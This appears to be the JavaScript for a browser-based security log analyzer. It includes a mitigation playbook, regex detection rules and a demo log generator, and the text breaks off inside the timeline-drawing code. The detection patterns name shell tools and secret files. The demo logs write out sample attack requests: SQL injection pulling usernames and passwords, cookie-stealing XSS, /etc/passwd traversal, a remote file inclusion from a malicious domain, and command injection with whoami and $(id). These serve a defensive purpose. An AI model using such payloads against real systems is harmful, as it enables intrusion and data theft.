// ── Mitigations playbook database ──
const MITIGATIONS = {
  R001: {
    name: "SQL Injection (SQLi) Attempt",
    desc: "An attacker tried to inject SQL commands into web request parameters to bypass authentication or extract database content.",
    steps: [
      "Ensure all database queries use Parameterized Queries or Prepared Statements.",
      "Implement Input Validation using whitelist regexes for expected data types.",
      "Use an Object-Relational Mapper (ORM) to automatically parameterize queries.",
      "Deploy a Web Application Firewall (WAF) to inspect and block SQLi payloads.",
      "Sanitize application errors: Do not output raw database/driver details to client."
    ],
    action: "Block attacker IP at WAF or boundary firewall immediately."
  },
  R002: {
    name: "Cross-Site Scripting (XSS) Attempt",
    desc: "An attacker sent scripts (e.g. <script>, event handlers) to execute malicious code in the browsers of legitimate users.",
    steps: [
      "Apply Context-Aware HTML Encoding on all user inputs before rendering them on the page.",
      "Configure a strict Content Security Policy (CSP) header (e.g., default-src 'self').",
      "Set HttpOnly and Secure flags on session cookies to prevent document.cookie extraction.",
      "Use modern UI frameworks (like React, Angular, Vue) which escape variables by default.",
      "Sanitize rich HTML inputs using library-based sanitizers (e.g. DOMPurify)."
    ],
    action: "Mitigate parameter reflective inputs and monitor session cookie access."
  },
  R003: {
    name: "Path Traversal Attempt",
    desc: "An attacker used parent directory symbols (like ../) to access file system resources outside the web root.",
    steps: [
      "Never pass user-supplied file names directly to file system APIs.",
      "Use base directory canonicalization (e.g., realpath) and verify it starts with web root.",
      "Configure web server permissions so the running process has strict read-only access to specific folders.",
      "Run the web server inside a chroot jail or containerized environment.",
      "Whitelist permitted file names/extensions rather than attempting to blacklist characters."
    ],
    action: "Add IP to firewall blacklist; patch directory access permissions."
  },
  R004: {
    name: "Sensitive Path Access",
    desc: "An attacker requested access to server administrator panels, server stats, or diagnostic endpoints.",
    steps: [
      "Restrict admin portals (e.g. /admin, /phpmyadmin) to specific internal IPs or VPN networks.",
      "Disable debugging and diagnostic actuator endpoints in production configurations.",
      "Change default URLs for administration consoles to custom, unpredictable endpoints.",
      "Implement Multi-Factor Authentication (MFA) on all access panels.",
      "Rate-limit authentication requests globally to prevent automated scans."
    ],
    action: "Validate user privileges and restrict administrative panel exposure."
  },
  R005: {
    name: "Security Scanner Detection",
    desc: "Automated vulnerability scanner (e.g. sqlmap, nikto, nuclei) user-agent was detected probing the system.",
    steps: [
      "Block requests from automated scanner User-Agents at the load balancer or proxy level.",
      "Implement rate-limiting to throttle rapid scanner scans.",
      "Verify that standard security headers (like Server, X-Powered-By) are stripped to avoid OS/version disclosure.",
      "Analyze scanner target paths to verify if the attacker found any vulnerable resources.",
      "Establish active log monitoring to trace scanner IPs attempting complex manual payloads next."
    ],
    action: "Block Scanner User-Agent and block IP at the network boundary."
  },
  R006: {
    name: "Authentication Failure",
    desc: "A failed login attempt was logged. This could indicate a mistyped credential or an active profiling probe.",
    steps: [
      "Verify the user account involved to ensure it is not locked or compromised.",
      "Check if MFA was triggered and passed for the user.",
      "Ensure passwords are not transmitted in plaintext and credentials comply with complexity policies.",
      "Configure account lockout thresholds after a reasonable number of attempts.",
      "If SSH failed, disable password logins in sshd_config and enforce SSH Key logins."
    ],
    action: "Monitor account login frequency and ensure logins use secure channels."
  },
  R007: {
    name: "Server Error (HTTP 5xx)",
    desc: "The web server returned a 5xx status code, indicating an internal crash, database connection leak, or logic error.",
    steps: [
      "Review application error logs (stderr/stack traces) associated with the timestamp of the error.",
      "Verify if database connections are exhausted or backend services are unresponsive.",
      "Assess if the crash was induced by a specific malicious payload (e.g., Denial of Service attempt).",
      "Implement error handling that gracefully recovers without crashing the main service.",
      "Deploy monitoring alerts for 5xx error rate spikes."
    ],
    action: "Inspect server runtime logs to locate the exception stack trace."
  },
  R008: {
    name: "Brute Force Attack Detected",
    desc: "Multiple authentication failures were logged from a single IP within a short window, suggesting password spraying or brute forcing.",
    steps: [
      "Block the offending IP address in the firewall (e.g., fail2ban or WAF rule).",
      "Verify if any login attempts succeeded in the trailing timeframe.",
      "Require CAPTCHA challenges after consecutive failed login attempts on web portals.",
      "Enforce key-based authentication for SSH and disable root SSH login.",
      "Remind affected users to rotate passwords to high-entropy values."
    ],
    action: "RUN: iptables -A INPUT -s <IP> -j DROP or add IP to WAF IP blocklist immediately."
  },
  R009: {
    name: "Directory / Port Scanning",
    desc: "An IP generated excessive HTTP 404 Not Found errors, indicating automated scanning for backups, vulnerabilities, or open paths.",
    steps: [
      "Temporarily block the scanning IP to reduce server bandwidth and log pollution.",
      "Disable directory listing (Options -Indexes in Apache or Nginx config).",
      "Inspect logs to see if the scanner targets are modern frameworks (e.g. spring actuator, git, env) and make sure those directories are blocked.",
      "Implement a honeypot path (e.g. fake admin portal) that triggers automatic defensive blocking.",
      "Ensure custom 404 pages do not leak server software versions."
    ],
    action: "Add IP to rate-limiting pool or block IP on WAF blocklist."
  },
  R010: {
    name: "Denial of Service (DoS) Attempt",
    desc: "An IP generated an abnormally high volume of requests in a short window, threatening server availability.",
    steps: [
      "Enable rate-limiting at the proxy/CDN level (e.g., Cloudflare under-attack mode, Nginx limit_req).",
      "Drop connection packets at the boundary firewall using iptables or firewall managers.",
      "Optimize application code and enable object caching (Redis) to withstand request spikes.",
      "Implement connection limits per IP address (Nginx limit_conn).",
      "Distribute system load across multiple servers using a Load Balancer."
    ],
    action: "RUN: iptables -A INPUT -s <IP> -j DROP and toggle CDN-level JS challenge/CAPTCHA."
  },
  R011: {
    name: "Local/Remote File Inclusion (LFI/RFI)",
    desc: "An attacker tried to pass file paths or external URLs to file loaders to execute unauthorized local configurations or remote code.",
    steps: [
      "Disable allow_url_include and allow_url_fopen in PHP configurations if using PHP.",
      "Validate user parameters against an absolute whitelist of permitted file selections.",
      "Strip path directory modifiers (like /, \\) if you only expect file names.",
      "Enforce strict file permissions to prevent application server from accessing root filesystem files.",
      "Use database IDs or predefined hashes to reference files instead of exposing paths."
    ],
    action: "Block IP immediately and audit web application parameter loading scripts."
  },
  R012: {
    name: "Command Injection Attempt",
    desc: "An attacker tried to inject operating system commands (via shell operators like ;, |, &&) into inputs.",
    steps: [
      "Never execute raw input parameters via system shell executors (e.g. Python os.system(), PHP exec()).",
      "Use programmatic APIs (e.g., Python subprocess.run(args_list)) which do not invoke shell parsing.",
      "Apply strict alphanumeric white-list validation to parameters before system interactions.",
      "Run the application user inside a shell-restricted environment (non-interactive shell).",
      "Enforce Least Privilege Principle: application process should not have system root credentials."
    ],
    action: "Block IP immediately; audit code files executing system shell scripts."
  },
  R013: {
    name: "Web Shell Access Attempt",
    desc: "An attacker requested access to common script filenames associated with web shells (e.g. shell.php, backdoor.jsp).",
    steps: [
      "Immediately audit the directory path containing the web shell file. If the file exists, delete it immediately.",
      "Review file upload endpoints to ensure uploaded files are not executable and are stored outside web root.",
      "Perform a full file integrity check of the web server files against version control repository.",
      "Look for unauthorized modifications in cron jobs, startup scripts, and system users.",
      "Verify system process lists for active backdoor shells running on alternate ports."
    ],
    action: "URGENT: Inspect file path on server, delete any unauthorized script files, and terminate active sub-processes."
  },
  R014: {
    name: "Sensitive Configuration Access",
    desc: "An attacker attempted to download database backups, .env config variables, repository metadata, or software source files.",
    steps: [
      "Configure web server rules to deny access to files starting with . (e.g., deny all requests for .env, .git, .vscode).",
      "Store configuration databases, keys, and backups outside the public document web directory.",
      "Verify that directory listing is disabled globally on all folders.",
      "Ensure web server permissions prevent access to .git/ folder.",
      "Immediately rotate database passwords, API keys, and secret keys if .env or backup files were accessed successfully."
    ],
    action: "Block IP and review access control permissions for configuration files."
  }
};

// ── Inline Python-equivalent analysis engine (JS port) ──

const SQLI = /union[\s+]+select|select\s+.+from|insert\s+into|drop\s+table|--\s*$|;\s*--|'\s*or\s+'1'='1|1=1|exec\s*\(|xp_cmdshell/i;
const XSS  = /<script[^>]*>|javascript:|onerror=|onload=|eval\(|alert\(|document\.cookie/i;
const TRAV = /\.\.[\\/]|%2e%2e[\\/]|%252e/i;
const SCAN_UA = /nikto|sqlmap|nmap|masscan|zgrab|nuclei|dirbuster|gobuster/i;
const SENS = /\/admin|\/phpmyadmin|\/actuator|\/api\/v\d+\/admin/i;
const LFI_RFI = /=https?:\/\/|=ftp:\/\/|\/etc\/passwd|\/etc\/hosts|\/win\.ini|boot\.ini/i;
const CMD_INJ = /[;&|`]\s*(cat|wget|curl|ping|id|whoami|uname|sh|bash|powershell|cmd\.exe)\b|\$\(.*\)/i;
const WEB_SHELL = /shell\.php|cmd\.php|c99\.php|r57\.php|eval-stdin\.php|backdoor\.php|shell\.jsp|cmd\.jsp|cmd\.aspx/i;
const CRED_LEAK = /\.env|\.git\/config|wp-config\.php|database\.yml|config\.json|settings\.py|backup\.sql|dump\.sql|\.bak|\.sql/i;
const IP_RE = /\b(?:\d{1,3}\.){3}\d{1,3}\b/;

const APACHE_RE = /^(\S+) \S+ (\S+) \[([^\]]+)\] "(\S+) (\S+) \S+" (\d{3})/;
const SSH_RE    = /(\w{3}\s+\d+\s+\d+:\d+:\d+).*?(Failed|Accepted|Invalid)\s+(?:password|publickey)?\s*for\s+(\S+)\s+from\s+(\S+)/i;

function parseLine(line) {
  // Handle structured JSON logs
  if (line.trim().startsWith('{') && line.trim().endsWith('}')) {
    try {
      const data = JSON.parse(line);
      const ip = data.ip || data.client_ip || data.host || IP_RE.exec(line)?.[0] || null;
      const user = data.user || data.username || null;
      const path = data.path || data.uri || data.url || data.request || null;
      const status = data.status !== undefined ? +data.status : null;
      return { ip, user, path, status, raw: line, message: data.message || data.msg || line };
    } catch(e){}
  }

  let m;
  m = APACHE_RE.exec(line);
  if (m) return { ip:m[1], user:m[2], ts:m[3], method:m[4], path:m[5], status:+m[6], raw:line };
  m = SSH_RE.exec(line);
  if (m) return { ip:m[4], user:m[3], status: m[2].toLowerCase() === 'accepted'?200:401, raw:line };
  const ipM = IP_RE.exec(line);
  return { ip: ipM?.[0]||null, raw:line, status:null };
}

function analyze(text) {
  const lines = text.split('\n').filter(l=>l.trim());
  const entries = lines.map(parseLine);

  const ipReqTs = {}, ip404Ts = {}, ipFailTs = {};
  const ipReqCount = {}, pathCount = {};
  const threatMap = {};

  const emit = (id, name, level, desc, e, count=1) => {
    const key = `${id}:${e.ip}:${e.user||''}`;
    if (threatMap[key]) { 
      threatMap[key].count += count; 
      if (e.raw && !threatMap[key].evidence.includes(e.raw) && threatMap[key].evidence.length < 5) {
        threatMap[key].evidence.push(e.raw);
      }
      return; 
    }
    threatMap[key] = { rule_id:id, rule_name:name, level, description:desc, ip:e.ip, user:e.user||null,
                       timestamp:new Date().toISOString(), count, evidence:[e.raw?.slice(0,160)||''] };
  };

  const LEVELS = { CRITICAL:4, HIGH:3, MEDIUM:2, LOW:1, INFO:0 };

  for (const e of entries) {
    const tgt = (e.path||'') + ' ' + (e.message||e.raw);
    const time = e.ts ? new Date(e.ts) : new Date();
    
    if (e.ip) {
      ipReqCount[e.ip] = (ipReqCount[e.ip]||0)+1;
      if (!ipReqTs[e.ip]) ipReqTs[e.ip] = [];
      ipReqTs[e.ip].push(time);
      
      if (e.status===404) {
        if (!ip404Ts[e.ip]) ip404Ts[e.ip] = [];
        ip404Ts[e.ip].push(time);
      }
      
      const m = e.raw.toLowerCase();
      if (m.includes('failed') || m.includes('invalid user') || m.includes('authentication failure') || m.includes('unauthorized') || e.status === 401 || e.status === 403) {
        if (!ipFailTs[e.ip]) ipFailTs[e.ip] = [];
        ipFailTs[e.ip].push(time);
      }
    }
    
    if (e.path) {
      pathCount[e.path] = (pathCount[e.path]||0)+1;
    }

    if (SQLI.test(tgt)) emit('R001','SQL Injection Attempt','HIGH',`Possible SQLi in request from ${e.ip}`,e);
    if (XSS.test(tgt))  emit('R002','XSS Attempt','MEDIUM',`Possible XSS payload from ${e.ip}`,e);
    if (TRAV.test(tgt)) emit('R003','Path Traversal','HIGH',`Directory traversal from ${e.ip}`,e);
    if (SENS.test(tgt)) emit('R004','Sensitive Path Access','MEDIUM',`Access to sensitive admin/management resource by ${e.ip}`,e);
    if (SCAN_UA.test(e.raw)) emit('R005','Security Scanner Detected','HIGH',`Scanner UA from ${e.ip}`,e);
    if ((e.status===401||e.status===403) || /failed|invalid user|authentication failure|unauthorized/i.test(e.raw))
      emit('R006','Authentication Failure','LOW',`Login failure for user '${e.user||'unknown'}' from ${e.ip}`,e);
    if (e.status>=500) emit('R007','Server Error','LOW',`HTTP ${e.status} response logged`,e);
    if (LFI_RFI.test(tgt)) emit('R011','LFI/RFI Attempt','HIGH',`Possible Local/Remote File Inclusion from ${e.ip}`,e);
    if (CMD_INJ.test(tgt)) emit('R012','Command Injection Attempt','HIGH',`Possible command injection from ${e.ip}`,e);
    if (WEB_SHELL.test(tgt)) emit('R013','Web Shell Access Attempt','HIGH',`Web shell file access detected from ${e.ip}`,e);
    if (CRED_LEAK.test(tgt)) emit('R014','Sensitive Config Access','HIGH',`Access to configuration/backup file from ${e.ip}`,e);
  }

  // Aggregate rules with sliding window logic (5 minutes)
  const WINDOW_MS = 5 * 60 * 1000;
  const getPeakWindow = (tsList) => {
    if (!tsList || !tsList.length) return 0;
    const sorted = tsList.map(ts => new Date(ts).getTime()).sort((a,b)=>a-b);
    let maxCount = 0;
    let left = 0;
    for (let right = 0; right < sorted.length; right++) {
      while (sorted[right] - sorted[left] > WINDOW_MS) {
        left++;
      }
      const count = right - left + 1;
      if (count > maxCount) maxCount = count;
    }
    return maxCount;
  };

  for (const [ip, tsList] of Object.entries(ipFailTs)) {
    const cnt = getPeakWindow(tsList);
    if (cnt>=5) emit('R008','Brute Force Attack','CRITICAL',`Brute force: ${cnt} failed logins from ${ip} in 5min`,{ip,raw:`${cnt} failed logins`},cnt);
  }
  for (const [ip, tsList] of Object.entries(ip404Ts)) {
    const cnt = getPeakWindow(tsList);
    if (cnt>=20) emit('R009','Directory Scanning','HIGH',`Directory scan: ${cnt} 404s from ${ip} in 5min`,{ip,raw:`${cnt} 404 responses`},cnt);
  }
  for (const [ip, tsList] of Object.entries(ipReqTs)) {
    const cnt = getPeakWindow(tsList);
    if (cnt>=200) emit('R010','Possible DoS Attack','CRITICAL',`High request rate: ${cnt} reqs from ${ip} in 5min`,{ip,raw:`${cnt} requests`},cnt);
  }

  const threats = Object.values(threatMap).sort((a,b)=>LEVELS[b.level]-LEVELS[a.level]);
  const ipCounter = Object.entries(ipReqCount).sort((a,b)=>b[1]-a[1]).slice(0,10);
  const pathCounter = Object.entries(pathCount).sort((a,b)=>b[1]-a[1]).slice(0,10);
  const statusMap = {};
  for (const e of entries) if (e.status) statusMap[e.status] = (statusMap[e.status]||0)+1;

  let riskScore = 0;
  for (const t of threats) riskScore += LEVELS[t.level] * t.count;
  riskScore = Math.min(100, riskScore);

  const byLevel = {};
  for (const t of threats) byLevel[t.level] = (byLevel[t.level]||0)+1;

  return { threats, topIps:ipCounter, topPaths:pathCounter, statusMap, byLevel, riskScore,
           totalEntries:lines.length, parsedEntries:entries.length,
           uniqueIps: Object.keys(ipReqCount).length, entries };
}

// ── Demo log generator ──
function generateDemo() {
  const ips = ['192.168.1.45','10.0.0.7','203.0.113.88','198.51.100.42','91.108.4.1','185.220.101.5','45.33.32.156','198.199.80.1','172.16.0.9'];
  const paths = ['/','/login','/api/users','/dashboard','/static/app.js','/api/products'];
  const lines = [];
  const now = new Date(); now.setHours(8,0,0,0);
  const fmt = d => d.toLocaleDateString('en-GB',{day:'2-digit',month:'short',year:'numeric'}).replace(/ /g,'/')+':'+d.toTimeString().slice(0,8)+' +0000';
  const apL = (ip,d,m,p,s) => `${ip} - - [${fmt(d)}] "${m} ${p} HTTP/1.1" ${s} 512`;
  const sshF = (ip,u,d,ok) => { const t=new Date(d); const mo=['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'][t.getMonth()]; return `${mo} ${t.getDate().toString().padStart(2,' ')} ${t.toTimeString().slice(0,8)} server sshd: ${ok?'Accepted':'Failed'} password for ${ok?'':'invalid user '}${u} from ${ip} port 22 ssh2`; };
  
  // Normal traffic
  for (let i=0;i<80;i++) { const d=new Date(now.getTime()+i*40000); lines.push(apL(ips[i%5],d,'GET',paths[i%paths.length],[200,200,301,304,404][i%5])); }
  // Brute force
  const bfBase=new Date(now.getTime()+3600000);
  for (let i=0;i<12;i++) lines.push(sshF('91.108.4.1','admin',new Date(bfBase.getTime()+i*15000),false));
  lines.push(sshF('91.108.4.1','admin',new Date(bfBase.getTime()+200000),true));
  // SQLi
  ['/?id=1\' UNION SELECT username,password FROM users--','/api/users?filter=1 OR 1=1'].forEach(p => { const d=new Date(now.getTime()+1800000); lines.push(apL('185.220.101.5',d,'GET',p,200)); lines.push(apL('185.220.101.5',d,'POST',p,500)); });
  // Path traversal
  lines.push(apL('45.33.32.156',new Date(now.getTime()+2100000),'GET','/../../etc/passwd',403));
  // XSS
  lines.push(apL('198.199.80.1',new Date(now.getTime()+2400000),'GET','/search?q=<script>alert(document.cookie)</script>',200));
  // Sensitive paths
  ['/.env','/wp-config.php','/.git/config','/backup.sql','/phpmyadmin/'].forEach(p => lines.push(apL('185.220.101.5',new Date(now.getTime()+2700000),'GET',p,[200,403,404][Math.floor(Math.random()*3)])));
  // Scanner UA
  lines.push(`185.220.101.5 - - [${fmt(new Date(now.getTime()+4000000))}] "GET /vulnerabilities HTTP/1.1" 200 1234 "-" "sqlmap/1.7 (https://sqlmap.org)"`);
  // LFI / RFI
  lines.push(apL('198.51.100.42', new Date(now.getTime()+4200000), 'GET', '/index.php?file=http://malicious-domain.com/malware.txt', 200));
  lines.push(apL('198.51.100.42', new Date(now.getTime()+4250000), 'GET', '/preview.php?path=/etc/passwd', 403));
  // Command Injection
  lines.push(apL('203.0.113.88', new Date(now.getTime()+4400000), 'POST', '/ping?ip=8.8.8.8;whoami', 200));
  lines.push(apL('203.0.113.88', new Date(now.getTime()+4430000), 'GET', '/debug?check=$(id)', 500));
  // Web Shell
  lines.push(apL('185.220.101.5', new Date(now.getTime()+4600000), 'GET', '/uploads/shell.php', 200));
  lines.push(apL('185.220.101.5', new Date(now.getTime()+4650000), 'POST', '/css/cmd.jsp?cmd=ls', 404));
  // Config access
  lines.push(apL('91.108.4.1', new Date(now.getTime()+4800000), 'GET', '/config.json', 200));
  lines.push(apL('91.108.4.1', new Date(now.getTime()+4850000), 'GET', '/database.yml', 403));
  // Dir scan
  for (let i=0;i<25;i++) lines.push(apL('198.199.80.1', new Date(now.getTime()+3600000+i*8000),'GET',`/probe-${1000+i}`,404));
  // DoS
  for (let i=0;i<220;i++) lines.push(apL('172.16.0.9', new Date(now.getTime()+5000000+i*1000),'GET','/api/heavy',200));
  
  // Shuffle
  for (let i=lines.length-1;i>0;i--) { const j=Math.floor(Math.random()*(i+1)); [lines[i],lines[j]]=[lines[j],lines[i]]; }
  return lines.join('\n');
}

// ── UI rendering state ──
let currentReport = null;
let activeFilter = 'ALL';
let rawLogsText = '';

// Drag and drop event handlers
function handleDragOver(e) {
  e.preventDefault();
  document.getElementById('upload-zone').classList.add('drag');
}
function handleDragLeave(e) {
  e.preventDefault();
  document.getElementById('upload-zone').classList.remove('drag');
}
function handleDrop(e) {
  e.preventDefault();
  document.getElementById('upload-zone').classList.remove('drag');
  if (e.dataTransfer.files && e.dataTransfer.files[0]) {
    processFile(e.dataTransfer.files[0]);
  }
}
function fileChosen(inp) {
  if (inp.files[0]) processFile(inp.files[0]);
}
function pasteMode() {
  document.getElementById('paste-area').style.display='block';
  document.getElementById('paste-input').focus();
}
function closePasteArea() {
  document.getElementById('paste-area').style.display='none';
}
function analyzePaste() {
  const t=document.getElementById('paste-input').value.trim();
  if(t) runAnalysis(t,'paste');
}

function runDemo() {
  fetch('/api/sample_logs')
    .then(res => {
      if (!res.ok) throw new Error();
      return res.text();
    })
    .then(logs => {
      runAnalysis(logs, 'sample_logs');
    })
    .catch(() => {
      runAnalysis(generateDemo(), 'sample_logs');
    });
}

function downloadDemoLogs() {
  fetch('/api/sample_logs')
    .then(res => {
      if (!res.ok) throw new Error();
      return res.text();
    })
    .then(logs => {
      triggerDownload(logs);
    })
    .catch(() => {
      triggerDownload(generateDemo());
    });
}

function triggerDownload(logText) {
  const blob = new Blob([logText], { type: 'text/plain' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = 'sample_security_logs.log';
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  URL.revokeObjectURL(url);
}

function processFile(file) {
  const r = new FileReader();
  r.onload = e => runAnalysis(e.target.result, file.name);
  r.readAsText(file);
}

function runAnalysis(text, source) {
  rawLogsText = text;
  document.getElementById('loading').style.display='flex';
  document.getElementById('empty-state').style.display='none';
  document.getElementById('threats-section').style.display='none';
  document.getElementById('risk-bar-wrap').style.display='none';
  document.getElementById('charts-row').style.display='none';
  document.getElementById('analytics-row').style.display='none';
  document.getElementById('feed-section').style.display='none';
  document.getElementById('exporters-row').style.display='none';
  
  // Clear inspector panel
  document.getElementById('inspector-content').style.display = 'none';
  document.getElementById('inspector-placeholder').style.display = 'flex';

  fetch('/api/analyze', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ log_text: text, source: source })
  })
  .then(res => {
    if (!res.ok) throw new Error('API server connection refused');
    return res.json();
  })
  .then(report => {
    const normalizedReport = {
      parsedEntries: report.parsed_entries,
      totalEntries: report.total_entries,
      riskScore: report.risk_score,
      topIps: report.top_ips,
      topPaths: report.top_paths || [],
      byLevel: report.summary.by_level,
      statusMap: report.summary.status_codes,
      uniqueIps: report.summary.unique_ips,
      threats: report.threats.map(t => ({
        rule_id: t.rule_id,
        level: t.level,
        rule_name: t.rule_name,
        description: t.description,
        ip: t.ip,
        user: t.user,
        count: t.count,
        timestamp: t.timestamp,
        evidence: t.evidence || []
      })),
      timeline: report.timeline || {},
      original: report
    };
    currentReport = normalizedReport;
    document.getElementById('loading').style.display='none';
    renderReport(currentReport, source, text);
  })
  .catch(err => {
    console.warn('Fallback to browser local parser:', err);
    setTimeout(() => {
      currentReport = analyze(text);
      document.getElementById('loading').style.display='none';
      renderReport(currentReport, source, text);
    }, 100);
  });
}

const LEVEL_ORDER = ['CRITICAL','HIGH','MEDIUM','LOW','INFO'];

function renderReport(r, source, rawText) {
  // Header meta
  document.getElementById('meta-info').innerHTML = `
    <span class="meta-label">SOURCE:</span> ${source.toUpperCase()} &bull;
    <span class="meta-label">ENTRIES:</span> ${r.totalEntries} PARSED
  `;

  // Exporters row
  document.getElementById('exporters-row').style.display = 'flex';

  // Risk Bar
  const rw = document.getElementById('risk-bar-wrap');
  rw.style.display = 'flex';
  const score = r.riskScore;
  const scoreColor = score>=75 ? 'var(--sev-critical)' : score>=50 ? 'var(--sev-high)' : score>=25 ? 'var(--sev-medium)' : 'var(--sev-low)';
  rw.style.setProperty('--accent', scoreColor);
  document.getElementById('risk-score-txt').textContent = score;
  const fill = document.getElementById('risk-fill');
  const glow = document.getElementById('risk-glow');
  fill.style.width = '0%';
  if (glow) glow.style.width = '0%';
  fill.style.background = 'var(--accent)';
  if (glow) glow.style.background = 'var(--accent)';
  requestAnimationFrame(()=>setTimeout(()=>{
    fill.style.width=score+'%';
    if (glow) glow.style.width=score+'%';
  }, 50));

  // Stats Grid
  const levelCounts = r.byLevel || {};
  const sg = document.getElementById('stat-grid');
  sg.innerHTML = [
    ['TOTAL LOG LINES', r.totalEntries, 'var(--accent)'],
    ['UNIQUE IPs PROBED', r.uniqueIps, 'var(--sev-info)'],
    ['THREAT EVENTS', r.threats.length, r.threats.length > 5 ? 'var(--sev-critical)' : 'var(--sev-medium)'],
    ['CRITICAL ALERTS', levelCounts.CRITICAL || 0, 'var(--sev-critical)'],
    ['HIGH ALERTS', levelCounts.HIGH || 0, 'var(--sev-high)'],
    ['MEDIUM ALERTS', levelCounts.MEDIUM || 0, 'var(--sev-medium)'],
  ].map(([l,v,c])=>`
    <div class="stat-card" style="--accent-c: ${c}">
      <span class="stat-label">${l}</span>
      <div class="stat-value" style="color: ${c}">${v}</div>
    </div>
  `).join('');

  // Charts
  document.getElementById('charts-row').style.display = 'grid';
  document.getElementById('analytics-row').style.display = 'grid';

  // Threat Severity Matrix (using unified bar-row style)
  const severityChart = document.getElementById('severity-chart');
  const maxThreatVal = Math.max(...LEVEL_ORDER.map(l => levelCounts[l]||0), 1);
  severityChart.innerHTML = LEVEL_ORDER.map(l => {
    const val = levelCounts[l] || 0;
    const clr = l === 'CRITICAL' ? 'var(--sev-critical)' : l === 'HIGH' ? 'var(--sev-high)' : l === 'MEDIUM' ? 'var(--sev-medium)' : l === 'LOW' ? 'var(--sev-low)' : 'var(--sev-info)';
    const pct = Math.round((val / maxThreatVal) * 100);
    return `
      <div class="bar-row">
        <span class="bar-label" style="min-width: 90px; display: inline-flex; align-items: center; gap: 8px;">
          <span class="chip-dot" style="background:${clr}; box-shadow: 0 0 6px ${clr}; position: static; width: 6px; height: 6px;"></span>
          ${l}
        </span>
        <div class="bar-track"><div class="bar-fill" data-w="${pct}%" style="width:0%; background:${clr}"></div></div>
        <span class="bar-count">${val}</span>
      </div>
    `;
  }).join('');

  // Top IPs
  const maxReq = r.topIps[0]?.[1] || 1;
  document.getElementById('ip-chart').innerHTML = r.topIps.slice(0, 6).map(([ip,cnt])=>`
    <div class="bar-row">
      <span class="bar-label" title="${ip}">${ip}</span>
      <div class="bar-track"><div class="bar-fill" data-w="${Math.round(cnt/maxReq*100)}%" style="width:0%; background:var(--accent)"></div></div>
      <span class="bar-count">${cnt}</span>
    </div>`).join('');

  // Top Paths (Target Targets)
  const topPaths = r.topPaths || [];
  const maxPathReq = topPaths[0]?.[1] || 1;
  document.getElementById('path-chart').innerHTML = topPaths.slice(0, 6).map(([path,cnt])=>`
    <div class="bar-row">
      <span class="bar-label" title="${escHTML(path)}">${escHTML(path.slice(0,25))}${path.length>25?'…':''}</span>
      <div class="bar-track"><div class="bar-fill" data-w="${Math.round(cnt/maxPathReq*100)}%" style="width:0%; background:var(--sev-info)"></div></div>
      <span class="bar-count">${cnt}</span>
    </div>`).join('');

  // Trigger animations for all bar charts
  setTimeout(()=>document.querySelectorAll('.bar-fill').forEach(el=>el.style.width=el.dataset.w), 120);

  // Timeline canvas
  renderTimeline(r.timeline || r.entries);

  // Filter Row
  const fr = document.getElementById('filter-row');
  const counts = { ALL: r.threats.length };
  for (const l of LEVEL_ORDER) counts[l] = (levelCounts[l] || 0);
  activeFilter = 'ALL';
  fr.innerHTML = ['ALL', ...LEVEL_ORDER].map(l => `<button class="filter-btn ${l==='ALL'?'active':''}" onclick="setFilter('${l}', this)">${l} (${counts[l]||0})</button>`).join('');

  // Threat table
  document.getElementById('threats-section').style.display='block';
  renderThreats(r.threats);

  // Raw Log feed
  document.getElementById('feed-section').style.display = 'block';
  renderLogFeed(rawText);
}

// ── Timeline state ──
let _tlKeys = [], _tlVals = [], _tlMax = 1, _tlPts = [];

function renderTimeline(entriesOrBuckets) {
  let buckets = {};
  if (Array.isArray(entriesOrBuckets)) {
    for (const e of entriesOrBuckets) {
      const raw = e.raw || '';
      const m = raw.match(/\d{2}:\d{2}/);
      if (m) { buckets[m[0]] = (buckets[m[0]] || 0) + 1; }
    }
  } else if (entriesOrBuckets && typeof entriesOrBuckets === 'object') {
    buckets = entriesOrBuckets;
  }

  const keys  = Object.keys(buckets).sort();
  const vals  = keys.map(k => buckets[k]);
  const max   = Math.max(...vals, 1);
  const total = vals.reduce((a, b) => a + b, 0);
  const peakVal = Math.max(...vals, 0);

  // Update stat chips
  const chips = document.getElementById('timeline-stat-chips');
  if (chips) {
    chips.style.display = 'flex';
    document.getElementById('tl-total').textContent  = total.toLocaleString();
    document.getElementById('tl-peak').textContent   = peakVal;
    document.getElementById('tl-window').textContent = keys.length;
  }

  const canvas   = document.getElementById('timeline-canvas');
  const emptyMsg = document.getElementById('timeline-empty-msg');
  const ctx      = canvas.getContext('2d');

  if (!keys.length) {
    canvas.style.opacity = '0';
    if (emptyMsg) emptyMsg.style.display = 'flex';
    return;
  }
  canvas.style.opacity = '1';
  if (emptyMsg) emptyMsg.style.display = 'none';

  const dpr  = window.devicePixelRatio || 1;
  const wrap = document.getElementById('timeline-wrap') || canvas.parentElement;
  const W    = wrap.clientWidth  || 700;
  const H    = wrap.clientHeight || 240;
  canvas.width  = W * dpr;
  canvas.height = H * dpr;
  ctx.scale(dpr, dpr);

  _tlKeys = keys; _tlVals = vals; _tlMax = max;

  const PAD_L = 52, PAD_R = 20, PAD_T = 20, PAD_B = 34;
  const cW = W - PAD_L - PAD_R;
  const cH = H - PAD_T - PAD_B;
  const bw = cW / Math.max(keys.length - 1, 1);

  ctx.clearRect(0, 0, W, H);

  const isDark    = document.body.getAttribute('data-theme') !== 'light';
  const gridColor = isDark ? 'rgba(255,255,255,0.04)'  : 'rgba(0,0,0,0.05)';
  const lblColor  = isDark ? 'rgba(148,163,184,0.5)'   : 'rgba(71,85,105,0.6)';
  const accentRGB = isDark ? '16,185,129'               : '5,150,105';
  const violetRGB = isDark ? '139,92,246'               : '124,58,237';

  // Y grid lines + labels
  const yLines = 4;
  for (let i = 0; i <= yLines; i++) {
    const y    = PAD_T + (cH / yLines) * i;
    const yVal = Math.round(max - (max / yLines) * i);
    ctx.save();
    ctx.setLineDash([3, 6]);
    ctx.strokeStyle = gridColor;
    ctx.lineWidth   = 1;
    ctx.beginPath(); ctx.moveTo(PAD_L, y); ctx.lineTo(W - PAD_R, y); ctx.stroke();
    ctx.restore();
    ctx.fillStyle  = lblColor;
    ctx.font       = `600 9px 'Geist Mono',monospace`;
    ctx.textAlign  = 'right';
    ctx.fillText(yVal, PAD_L - 8, y + 3.5);
  }

  // Bezier points
  const pts = keys.map((k, i) => ({
    x: PAD_L + i * bw,
    y: PAD_T + cH - (vals[i] / max) * cH
